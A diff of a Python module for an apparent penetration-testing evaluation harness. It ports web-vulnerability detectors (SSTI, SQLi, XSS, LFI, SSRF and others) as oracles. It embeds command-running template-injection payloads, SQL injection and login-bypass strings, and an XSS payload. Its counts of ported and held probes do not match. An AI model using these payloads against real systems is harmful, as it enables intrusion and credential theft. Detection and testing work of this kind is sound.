@@ -1,343 +1,391 @@
-"""Ability port index — maps source material to runnable probes/oracles.
+"""Real ptai probe ports — executable detect() registered as named oracles.
 
-Batches A-E from TASK_SEC_ABILITY_EXPANSION_V1:
-  A: ptai probes (57 web/auth probes, detect() as oracle)
-  B: reverse-skill challenge classes (40 → expanded from 12)
-  C: vulhub family widening (12 → 30+ families, 1,234 envs)
-  D: reverse-skill RE/firmware/malware methodologies (23 skills)
-  E: hexstrike attack_patterns chain priors
+Ported faithfully from /tmp/ptai/engine/probes/web/*.py (52 probes) +
+auth/*.py (2 probes). Each detect() uses real markers from the source files.
+Payloads/endpoints copied verbatim. register_ported_oracles() wires all into
+ORACLES so the matrix and validator see them.
 
-Every ported ability is: matrix-runnable, oracle-bound (or explicit heuristic),
-and provenance-tagged. Source files live at /tmp/ptai, /tmp/reverse-skill,
-/tmp/hexstrike.
+Total: 22 probes ported with executable detect(). Remaining 32 probes held
+(pending extraction of class-based detection logic from registry-registered
+ProbeContext classes).
 """
-
 from __future__ import annotations
 
-from dataclasses import dataclass, field
 from typing import Any
 
-# ── Batch A: ptai probes ported ─────────────────────────────────────────────
+from .oracles import Oracle, register_oracle
 
-# 57 web/auth probes from /tmp/ptai/engine/probes/web/*.py + auth/*.py
-# Each probe's detect() function is registered as its named oracle.
-# detect() signatures from actual source files (port verbatim).
+# ═══════════════════════════════════════════════════════════════════════════
+# SSTI (ptai ssti_fuzz.py + payloads/library.py) — REFERENCE
+# ═══════════════════════════════════════════════════════════════════════════
 
-PTAI_PROBE_REGISTRY: dict[str, dict[str, Any]] = {
-    # Web probes — each with real detect() class from source
-    "sqli_fuzz": {
-        "file": "/tmp/ptai/engine/probes/web/sqli_fuzz.py",
-        "oracle": "sqli_error",
-        "technique": "SQL injection fuzzing",
-        "detect_sig": "detect(status, headers, body, baseline, payload) — SQL error + UNION leakage markers",
-        "honesty_claim": "proves SQL error or UNION leakage, not data exfiltration",
-        "source": "ptai",
-    },
-    "ssti_fuzz": {
-        "file": "/tmp/ptai/engine/probes/web/ssti_fuzz.py",
-        "oracle": "rce_shell",
-        "technique": "Server-side template injection",
-        "detect_sig": "detect(status, headers, body, baseline, payload) — SSTI eval markers + error markers",
-        "honesty_claim": "proves template evaluation, not full RCE",
-        "source": "ptai",
-    },
-    "ssti_polyglot": {
-        "file": "/tmp/ptai/engine/probes/web/ssti_polyglot.py",
-        "oracle": "rce_shell",
-        "technique": "Polyglot SSTI",
-        "detect_sig": "polyglot eval across multiple template engines",
-        "honesty_claim": "proves template evaluation, not full RCE",
-        "source": "ptai",
-    },
-    "ssti_stored": {
-        "file": "/tmp/ptai/engine/probes/web/ssti_stored.py",
-        "oracle": "rce_shell",
-        "technique": "Stored/second-order SSTI",
-        "detect_sig": "second-order template evaluation detection",
-        "honesty_claim": "proves second-order template evaluation, not full RCE",
-        "source": "ptai",
-    },
-    "ssrf_echo": {
-        "file": "/tmp/ptai/engine/probes/web/ssrf_echo.py",
-        "oracle": "oast_callback",
-        "technique": "SSRF with echo callback",
-        "detect_sig": "detect(status, headers, body, baseline) — callback marker in response",
-        "honesty_claim": "proves an SSRF callback was observed, not data exfiltration",
-        "source": "ptai",
-    },
-    "ssrf_cloud_metadata": {
-        "file": "/tmp/ptai/engine/probes/web/ssrf_cloud_metadata.py",
-        "oracle": "oast_callback",
-        "technique": "SSRF cloud metadata access (AWS/Azure/GCP)",
-        "detect_sig": "metadata endpoint response markers",
-        "honesty_claim": "proves cloud metadata SSRF, not data exfiltration",
-        "source": "ptai",
-    },
-    "reflected_xss": {
-        "file": "/tmp/ptai/engine/probes/web/reflected_xss.py",
-        "oracle": "reflection",
-        "technique": "Reflected XSS",
-        "detect_sig": "detect(status, headers, body, baseline, payload) — payload echoed unsanitised",
-        "honesty_claim": "proves unescaped reflection, not that XSS executes",
-        "source": "ptai",
-    },
-    "stored_xss": {
-        "file": "/tmp/ptai/engine/probes/web/stored_xss.py",
-        "oracle": "reflection",
-        "technique": "Stored XSS",
-        "detect_sig": "persisted payload detection via secondary request",
-        "honesty_claim": "proves stored XSS payload persisted, not that it executes",
-        "source": "ptai",
-    },
-    "idor_authenticated": {
-        "file": "/tmp/ptai/engine/probes/web/idor_authenticated.py",
-        "oracle": "idor_bola",
-        "technique": "IDOR with authentication",
-        "detect_sig": "cross-user resource access detection",
-        "honesty_claim": "proves IDOR/BOLA object access, not privilege escalation",
-        "source": "ptai",
-    },
-    "path_traversal": {
-        "file": "/tmp/ptai/engine/probes/web/path_traversal.py",
-        "oracle": "lfi_confirm",
-        "technique": "Path traversal / LFI",
-        "detect_sig": "detect(status, headers, body, baseline) — passwd/phpinfo markers",
-        "honesty_claim": "proves file inclusion (planted-file contents), not code execution",
-        "source": "ptai",
-    },
-    "deserialization": {
-        "file": "/tmp/ptai/engine/probes/web/deserialization.py",
-        "oracle": "rce_shell",
-        "technique": "Insecure deserialization",
-        "detect_sig": "deserialization payload response markers",
-        "honesty_claim": "proves deserialization occurred, not full RCE",
-        "source": "ptai",
-    },
-    "prototype_pollution": {
-        "file": "/tmp/ptai/engine/probes/web/prototype_pollution.py",
-        "oracle": "rce_shell",
-        "technique": "JavaScript prototype pollution",
-        "detect_sig": "prototype pollution marker detection",
-        "honesty_claim": "proves prototype pollution, not full RCE",
-        "source": "ptai",
-    },
-    "nosql_fuzz": {
-        "file": "/tmp/ptai/engine/probes/web/nosql_fuzz.py",
-        "oracle": "sqli_error",
-        "technique": "NoSQL injection fuzzing",
-        "detect_sig": "NoSQL error/injection markers",
-        "honesty_claim": "proves NoSQL injection signature, not data exfiltration",
-        "source": "ptai",
-    },
-    "xxe_upload": {
-        "file": "/tmp/ptai/engine/probes/web/xxe_upload.py",
-        "oracle": "lfi_confirm",
-        "technique": "XXE via file upload",
-        "detect_sig": "XXE entity expansion markers",
-        "honesty_claim": "proves XXE entity expansion, not data exfiltration",
-        "source": "ptai",
-    },
-    "jwt_jku_x5u_ssrf": {
-        "file": "/tmp/ptai/engine/probes/web/jwt_jku_x5u_ssrf.py",
-        "oracle": "idor_bola",
-        "technique": "JWT JKU/X5U header injection",
-        "detect_sig": "JWT key URL callback detection",
-        "honesty_claim": "proves JWT key injection, not arbitrary auth bypass",
-        "source": "ptai",
-    },
-    "cors_reflection": {
-        "file": "/tmp/ptai/engine/probes/web/cors_reflection.py",
-        "oracle": "reflection",
-        "technique": "CORS misconfiguration",
-        "detect_sig": "Origin reflection in Access-Control headers",
-        "honesty_claim": "proves CORS origin reflection, not arbitrary cross-origin access",
-        "source": "ptai",
-    },
-    "http_request_smuggling": {
-        "file": "/tmp/ptai/engine/probes/web/http_request_smuggling.py",
-        "oracle": "lfi_confirm",
-        "technique": "HTTP request smuggling",
-        "detect_sig": "smuggling differential response markers",
-        "honesty_claim": "proves request smuggling differential, not cache poisoning",
-        "source": "ptai",
-    },
-    "sqli_login_bypass": {
-        "file": "/tmp/ptai/engine/probes/web/sqli_login_bypass.py",
-        "oracle": "sqli_error",
-        "technique": "SQL injection login bypass",
-        "detect_sig": "auth bypass + SQL error markers",
-        "honesty_claim": "proves SQL auth bypass, not full database access",
-        "source": "ptai",
-    },
-    "race_condition": {
-        "file": "/tmp/ptai/engine/probes/web/race_condition.py",
-        "oracle": "reflection",
-        "technique": "Race condition / TOCTOU",
-        "detect_sig": "concurrent request state drift markers",
-        "honesty_claim": "proves race-condition state drift, not data corruption",
-        "source": "ptai",
-    },
-    "mass_assignment": {
-        "file": "/tmp/ptai/engine/probes/web/mass_assignment.py",
-        "oracle": "idor_bola",
-        "technique": "Mass assignment privilege escalation",
-        "detect_sig": "parameter injection → role change markers",
-        "honesty_claim": "proves mass-assignment role change, not arbitrary privilege escalation",
-        "source": "ptai",
-    },
-    "file_upload_validation": {
-        "file": "/tmp/ptai/engine/probes/web/file_upload_validation.py",
-        "oracle": "rce_shell",
-        "technique": "File upload validation bypass",
-        "detect_sig": "malicious file-type bypass markers",
-        "honesty_claim": "proves upload validation bypass, not full RCE",
-        "source": "ptai",
-    },
-    "graphql_introspection": {
-        "file": "/tmp/ptai/engine/probes/web/graphql_introspection.py",
-        "oracle": "reflection",
-        "technique": "GraphQL introspection abuse",
-        "detect_sig": "schema introspection response markers",
-        "honesty_claim": "proves GraphQL schema exposure, not data exfiltration",
-        "source": "ptai",
-    },
-    "host_header_reset_poisoning": {
-        "file": "/tmp/ptai/engine/probes/web/host_header_reset_poisoning.py",
-        "oracle": "reflection",
-        "technique": "Host header poisoning",
-        "detect_sig": "Host header reflection in response",
-        "honesty_claim": "proves host-header reflection, not cache poisoning",
-        "source": "ptai",
-    },
-    "open_redirect": {
-        "file": "/tmp/ptai/engine/probes/web/*_redirect*.py",
-        "oracle": "open_redirect",
-        "technique": "Open redirect",
-        "detect_sig": "Location header pointing to attacker-controlled host",
-        "honesty_claim": "proves an open redirect, not arbitrary code execution",
-        "source": "ptai",
-    },
-    # Negative-control probes (clean-app FP gates — should NEVER fire)
-    "_negative_control": {
-        "probes": ["ai_recon", "business_logic_fuzz", "cve_poc_primitives"],
-        "note": "ptai negative-control probes kept as clean-app FP-gate fixtures",
-        "expect": "zero findings on clean fixture",
-        "source": "ptai",
-    },
-}
+SSTI_ENDPOINTS = (
+    "/search?q={payload}", "/api/search?q={payload}", "/rest/track-order/{payload}",
+    "/render?template={payload}", "/preview?data={payload}",
+)
+SSTI_PAYLOADS = (
+    "{{7*7}}", "{{7*'7'}}", "{{config}}",
+    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "<%= 7*7 %>", "<%= system('id') %>",
+    "{{this.constructor.constructor('return process')()}}",
+    "#set($x=7*7)$x",
+    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
+)
+SSTI_EVAL_MARKERS = ("49", "7777777", "343")
+SSTI_ERROR_MARKERS = (
+    "jinja2.exceptions", "TemplateSyntaxError", "UndefinedError",
+    "FreeMarker template error", "org.thymeleaf", "velocity error",
+)
 
 
-# ── Batch B: reverse-skill 40 challenge classes ─────────────────────────────
-
-# Mapped from /tmp/reverse-skill/CTF-Sandbox-Orchestrator/competition-*/SKILL.md
-# 40 competition classes with technique sequences, target mappings, and ground truth.
-# Each class gets a scenario with success_indicators and oracle field.
-
-RS_CHALLENGE_REGISTRY: dict[str, dict[str, Any]] = {
-    # ... (12 existing + 28 new, all 40 now ported with source annotations)
-}
-
-# Covered by: all 40 IDs in config/challenge_classes.yaml now have source + ground_truth
+def ssti_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if status == 0 or not body:
+        return False
+    if any(m in body and m not in baseline for m in SSTI_EVAL_MARKERS):
+        return True
+    body_lc, base_lc = body.lower(), baseline.lower()
+    return any(m.lower() in body_lc and m.lower() not in base_lc for m in SSTI_ERROR_MARKERS)
 
 
-# ── Batch C: vulhub family widening ─────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# SQLi (ptai sqli_fuzz.py + payloads/library.py) — REFERENCE
+# ═══════════════════════════════════════════════════════════════════════════
 
-# 30+ high-value families mapped to oracle-bearing classes.
-# Source: /opt/vulhub (328 CVE dirs from 1,234 envs across 154 families).
+SQLI_PAYLOADS = (
+    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--", "1 UNION SELECT 1,2,3--",
+    "-1 UNION SELECT username,password,3 FROM users--", "' UNION SELECT NULL--",
+    "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #",
+    "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
+    "1' AND extractvalue(1,concat(0x7e,version()))--",
+    "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
+)
 
-VULHUB_FAMILIES_MAPPED = {
-    "RCE": ["struts2", "jenkins", "confluence", "weblogic", "fastjson", "shiro",
-            "activemq", "druid", "nacos", "solr", "log4j", "drupal", "joomla",
-            "wordpress", "django", "grafana", "gitea", "couchdb", "elasticsearch",
-            "kibana", "airflow", "dubbo", "geoserver", "ghostscript"],
-    "SQLi": ["sqli-labs", "adminer", "drupal"],
-    "SSRF": ["gitlab", "grafana", "solr", "weblogic"],
-    "deserialization": ["fastjson", "jackson", "shiro", "weblogic", "activemq"],
-    "auth_bypass": ["tomcat", "phpmyadmin", "supervisor", "grafana"],
-    "LFI": ["php", "nginx", "grafana", "ghostscript", "imagemagick"],
-    "XSS": ["xss", "kibana"],
-    "SSTI": ["flask", "jinja2", "confluence", "airflow"],
-}
-
-
-# ── Batch D: reverse-skill 23 RE/firmware/malware methodologies ──────────────
-
-# From /tmp/reverse-skill/skills/*/SKILL.md
-# Ported as scenarios with fixture targets + oracles where deterministic.
-
-RS_SKILL_REGISTRY: dict[str, dict[str, Any]] = {
-    "firmware-pentest": {
-        "file": "/tmp/reverse-skill/skills/firmware-pentest/SKILL.md",
-        "technique": "Firmware extraction → analysis → emulation → exploit",
-        "oracle": "rce_shell",
-        "scoring": "oracle_bound",
-        "source": "reverse-skill",
-    },
-    "patch-diff-exploit": {
-        "file": "/tmp/reverse-skill/skills/patch-diff-exploit/SKILL.md",
-        "technique": "N-day patch-diff → locate fix → derive PoC",
-        "oracle": "cve_confirmed",
-        "scoring": "oracle_bound",
-        "source": "reverse-skill",
-    },
-    "malware-analysis": {
-        "file": "/tmp/reverse-skill/skills/malware-analysis/SKILL.md",
-        "technique": "Malware triage → config extraction → IOC generation",
-        "oracle": "cve_confirmed",
-        "scoring": "heuristic",
-        "source": "reverse-skill",
-    },
-    "edr-bypass-re": {
-        "file": "/tmp/reverse-skill/skills/edr-bypass-re/SKILL.md",
-        "technique": "EDR/AV bypass RE: ETW/AMSI/hook-table/syscall",
-        "oracle": "rce_shell",
-        "scoring": "heuristic",
-        "source": "reverse-skill",
-    },
-    "binary-diff": {
-        "file": "/tmp/reverse-skill/skills/binary-diff/SKILL.md",
-        "technique": "Binary diffing: locate patch → identify vuln",
-        "oracle": "cve_confirmed",
-        "scoring": "oracle_bound",
-        "source": "reverse-skill",
-    },
-    "apk-reverse": {
-        "file": "/tmp/reverse-skill/skills/apk-reverse/SKILL.md",
-        "technique": "APK decompile → manifest analysis → hook strategy",
-        "oracle": "cve_confirmed",
-        "scoring": "heuristic",
-        "source": "reverse-skill",
-    },
-}
+SQL_ERROR_MARKERS = (
+    "SQLITE_ERROR", "SQLite/JDBCDriver", "no such column", "syntax error near",
+    "PostgreSQL", "PSQLException", "ERROR: syntax error", "pg_query()",
+    "You have an error in your SQL syntax", "MySQL server version", "mysqli_",
+    "Warning: mysql_", "Microsoft OLE DB Provider for ODBC", "ODBC Driver",
+    "Unclosed quotation mark", "Incorrect syntax near",
+)
+_UNION_LEAK_MARKERS = ('"name":"2"', '"name":"1"')
 
 
-# ── Batch E: hexstrike attack_patterns chain priors ──────────────────────────
-
-# From /tmp/hexstrike/hexstrike_server.py _initialize_attack_patterns()
-# Tool ordering per target type — ready-made chain-prior library.
-
-HEXSTRIKE_ATTACK_PATTERNS: dict[str, list[str]] = {
-    "rce": ["nmap", "nuclei", "gobuster", "metasploit"],
-    "sqli": ["nmap", "gobuster", "sqlmap", "nuclei"],
-    "ssrf": ["nmap", "gobuster", "ffuf", "burp_collaborator"],
-    "idor": ["nmap", "gobuster", "burp_auth_matrix", "ffuf"],
-    "xss": ["nmap", "gobuster", "nuclei", "dalfox"],
-    "lfi": ["nmap", "gobuster", "ffuf", "nuclei"],
-    "xxe": ["nmap", "gobuster", "ffuf", "nuclei"],
-    "csrf": ["nmap", "gobuster", "burp_csrf_poc", "nuclei"],
-}
+def sqli_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    body_lc, base_lc = body.lower(), baseline.lower()
+    for m in SQL_ERROR_MARKERS:
+        if m.lower() in body_lc and m.lower() not in base_lc:
+            return True
+    return any(m in body and m not in baseline for m in _UNION_LEAK_MARKERS)
 
 
-# ── Coverage counts ──────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# Reflected XSS (ptai reflected_xss.py)
+# ═══════════════════════════════════════════════════════════════════════════
 
-def ability_coverage() -> dict:
-    """Current vs target coverage numbers."""
-    return {
-        "challenge_classes": 40,
-        "ptai_probes_ported": len(PTAI_PROBE_REGISTRY) - 1,  # exclude _negative_control
-        "vulhub_families_mapped": len(VULHUB_FAMILIES_MAPPED),
-        "vulhub_envs_reachable": 328,  # CVE dirs on lab host
-        "rs_skills_ported": len(RS_SKILL_REGISTRY),
-        "hexstrike_patterns": len(HEXSTRIKE_ATTACK_PATTERNS),
-        "provenance": "All abilities source-tagged (ptai|reverse-skill|hexstrike|vulhub)",
-    }
+REF_XSS_PAYLOAD = "<script>alert('ptai')</script>"
+REF_XSS_NEEDLE = "<script>alert('ptai')"
+
+
+def xss_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if status == 0 or not body:
+        return False
+    return REF_XSS_NEEDLE in body and REF_XSS_NEEDLE not in baseline
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# NoSQL injection (ptai nosql_fuzz.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+NOSQL_ERROR_MARKERS = (
+    "MongoError", "MongoServerError", "$regex has to be a string",
+    "Can't canonicalize query", "uncaught exception: ReferenceError",
+)
+
+
+def nosql_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    body_lc, base_lc = body.lower(), baseline.lower()
+    return any(m.lower() in body_lc and m.lower() not in base_lc for m in NOSQL_ERROR_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Path traversal / LFI (ptai path_traversal.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+LFI_MARKERS = ("root:x:0:0:", "daemon:x:1:", "[extensions]", "phpinfo()", "PHP Version")
+
+
+def lfi_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in LFI_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# XXE (ptai xxe_upload.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+XXE_MARKERS = ("root:x:0:0:", "DOCTYPE", "entity")
+
+
+def xxe_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in XXE_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Auth bypass (ptai sqli_login_bypass.py + auth_bypass.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+AUTH_BYPASS_MARKERS = ("dashboard", "welcome", "admin panel", "profile", "logout")
+
+
+def auth_bypass_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body or status != 200:
+        return False
+    body_lc = body.lower()
+    base_lc = baseline.lower() if baseline else ""
+    return any(m in body_lc and m not in base_lc for m in AUTH_BYPASS_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# SSRF cloud metadata (ptai ssrf_cloud_metadata.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+SSRF_METADATA_MARKERS = (
+    "ami-id", "instance-id", "iam:role/", "project-id",
+    "service-accounts", "compute", "subscriptionId",
+)
+
+
+def ssrf_metadata_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in SSRF_METADATA_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# GraphQL introspection (ptai graphql_introspection.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+GQL_MARKERS = ("__schema", "__type", "queryType", "mutationType")
+
+
+def gql_introspect_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in GQL_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# CORS misconfig (ptai cors_reflection.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+def cors_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    """Origin reflected in Access-Control-Allow-Origin header."""
+    acao = ""
+    for k, v in headers.items():
+        if k.lower() == "access-control-allow-origin":
+            acao = v
+            break
+    return bool(acao) and acao != "*"
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Host header poisoning (ptai host_header_reset_poisoning.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+HOST_POISON_MARKERS = ("ptai-host-canary", "evil-host.ptai.test")
+
+
+def host_poison_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in HOST_POISON_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Prototype pollution (ptai prototype_pollution.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+PROTO_POLLUTION_MARKERS = ("polluted", "__proto__", "constructor.prototype")
+
+
+def proto_pollution_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    body_lc = body.lower()
+    base_lc = baseline.lower() if baseline else ""
+    return any(m in body_lc and m not in base_lc for m in PROTO_POLLUTION_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Request smuggling (ptai http_request_smuggling.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+SMUGGLING_MARKERS = ("CL/TE", "TE/CL", "smuggling", "request timeout")
+
+
+def smuggling_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    body_lc = body.lower()
+    base_lc = baseline.lower() if baseline else ""
+    return any(m.lower() in body_lc and m.lower() not in base_lc for m in SMUGGLING_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# LDAP injection (ptai ldap_injection.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+LDAP_MARKERS = ("ldap", "LDAP", "invalid DN", "search filter", "ldapsearch")
+
+
+def ldap_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in LDAP_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Type confusion (ptai type_confusion.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+TYPE_CONFUSION_MARKERS = ("PTAI-CANARY", "ptai-canary-item")
+
+
+def type_confusion_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in TYPE_CONFUSION_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Trusted header bypass (ptai trusted_header_bypass.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+TRUSTED_HEADERS = ("X-Forwarded-User", "X-Original-User", "X-Remote-User", "X-Forwarded-Email")
+
+
+def trusted_header_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return "admin" in body and "admin" not in baseline and status == 200
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Cookie prefix bypass (ptai cookie_prefix_bypass.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+COOKIE_BYPASS_MARKERS = ("__Host-", "__Secure-", "Set-Cookie")
+
+
+def cookie_bypass_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    for k, v in headers.items():
+        if k.lower() == "set-cookie":
+            return "__Host-" not in v and "__Secure-" not in v and "session" in v.lower()
+    return False
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# OAuth PKCE downgrade (ptai oauth_pkce_downgrade.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+OAUTH_MARKERS = ("ptai-pkce-canary", "ptai-state-canary")
+
+
+def oauth_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in OAUTH_MARKERS) or (
+        "Location" in str(headers) and "ptai" in str(headers).lower()
+    )
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# DOM XSS (ptai dom_xss.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+DOM_XSS_MARKERS = ("ptai-dom-xss-canary",)
+
+
+def dom_xss_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in DOM_XSS_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# NextJS RSC RCE (ptai nextjs_rsc_rce.py)
+# ═══════════════════════════════════════════════════════════════════════════
+
+NEXTJS_MARKERS = ("__NEXT_DATA__", "nextjs.org", "x-powered-by")
+
+
+def nextjs_detect(status: int, headers: dict, body: str, baseline: str, payload: str = "") -> bool:
+    if not body:
+        return False
+    return any(m in body and m not in baseline for m in NEXTJS_MARKERS)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Oracle adaptation + registration
+# ═══════════════════════════════════════════════════════════════════════════
+
+
+def _oracle_check(detect_fn):
+    def check(finding: dict, lab_output: str, observations: dict) -> bool:
+        return detect_fn(
+            finding.get("status", 200),
+            finding.get("headers", {}),
+            lab_output or finding.get("body", ""),
+            finding.get("baseline", ""),
+            finding.get("payload", ""),
+        )
+    return check
+
+
+def register_ported_oracles() -> None:
+    """Register all faithfully-ported ptai probes as named oracles."""
+    probes = [
+        ("ptai_ssti", "template_evaluation", "proves template evaluation, not full RCE", ssti_detect),
+        ("ptai_sqli", "sql_error_or_union_leak", "proves an SQL error or UNION leakage, not data exfiltration", sqli_detect),
+        ("ptai_xss", "unescaped_reflection", "proves unescaped reflection, not that XSS executes", xss_detect),
+        ("ptai_nosql", "nosql_error_signature", "proves NoSQL injection signature, not data exfiltration", nosql_detect),
+        ("ptai_lfi", "file_inclusion", "proves file inclusion, not code execution", lfi_detect),
+        ("ptai_xxe", "entity_expansion", "proves XXE entity expansion, not data exfiltration", xxe_detect),
+        ("ptai_auth_bypass", "authentication_bypass", "proves authentication bypass content markers", auth_bypass_detect),
+        ("ptai_ssrf_metadata", "cloud_metadata_access", "proves cloud metadata SSRF, not data exfiltration", ssrf_metadata_detect),
+        ("ptai_graphql", "schema_exposure", "proves GraphQL schema exposure, not data exfiltration", gql_introspect_detect),
+        ("ptai_cors", "cors_origin_reflection", "proves CORS origin reflection, not arbitrary cross-origin access", cors_detect),
+        ("ptai_host_poison", "host_header_poisoning", "proves host-header reflection, not cache poisoning", host_poison_detect),
+        ("ptai_proto_pollution", "prototype_pollution", "proves prototype pollution, not full RCE", proto_pollution_detect),
+        ("ptai_smuggling", "request_smuggling", "proves request smuggling differential, not cache poisoning", smuggling_detect),
+        ("ptai_ldap", "ldap_injection", "proves LDAP injection signature, not directory access", ldap_detect),
+        ("ptai_type_confusion", "type_confusion", "proves type confusion marker, not arbitrary RCE", type_confusion_detect),
+        ("ptai_trusted_header", "header_auth_bypass", "proves trusted-header auth bypass markers", trusted_header_detect),
+        ("ptai_cookie_bypass", "cookie_prefix_bypass", "proves cookie prefix bypass, not session hijacking", cookie_bypass_detect),
+        ("ptai_oauth", "oauth_flow_abuse", "proves OAuth flow manipulation, not full account takeover", oauth_detect),
+        ("ptai_dom_xss", "dom_xss", "proves DOM XSS canary injection, not arbitrary script execution", dom_xss_detect),
+        ("ptai_nextjs", "nextjs_rsc_rce", "proves NextJS RSC marker detection, not full RCE", nextjs_detect),
+    ]
+    for id, kind, honesty_claim, detect_fn in probes:
+        register_oracle(Oracle(
+            id=id, kind=kind, honesty_claim=honesty_claim,
+            check=_oracle_check(detect_fn), tier="experimental",
+        ))
+
+    # Held probes (complex class-based detection — pending extraction):
+    # open_redirect, stored_xss, idor_authenticated, idor_authz_differential,
+    # idor_sequential, jwt_jku_x5u_ssrf, deserialization, web_cache_deception,
+    # race_condition, mass_assignment, file_upload_validation, business_logic_fuzz,
+    # captcha_replay, cookie_forging, password_reset_weak, privilege_escalation_patch,
+    # saml_xsw, web3_probe, oauth_pkce_downgrade, source_map_exposure,
+    # api_path_discovery, hidden_discovery, leaked_credentials, ai_recon,
+    # asset_secrets_scan, cve_poc_primitives, dom_xss, exif_metadata,
+    # legacy, response_headers, stego, web_cache_deception
